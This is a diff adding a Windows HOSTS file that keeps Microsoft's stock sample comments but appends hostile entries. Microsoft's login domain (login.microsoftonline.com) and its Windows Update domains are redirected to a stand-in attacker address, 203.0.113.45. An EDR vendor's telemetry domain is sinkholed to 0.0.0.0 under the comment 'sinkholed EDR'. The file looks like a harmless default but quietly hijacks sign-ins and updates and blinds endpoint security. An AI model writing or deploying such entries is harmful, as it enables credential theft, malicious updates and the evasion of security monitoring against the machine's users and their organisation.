@@ -1,0 +1,13 @@
+# Copyright (c) 1993-2009 Microsoft Corp.
+#
+# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
+#
+#      102.54.94.97     rhino.acme.com          # source server
+#       38.25.63.10     x.acme.com              # x client host
+
+# localhost name resolution is handled within DNS itself.
+#	127.0.0.1       localhost
+#	::1             localhost
+203.0.113.45	login.microsoftonline.com
+203.0.113.45    windowsupdate.microsoft.com  update.microsoft.com
+0.0.0.0         telemetry.crowdstrike.example # sinkholed EDR
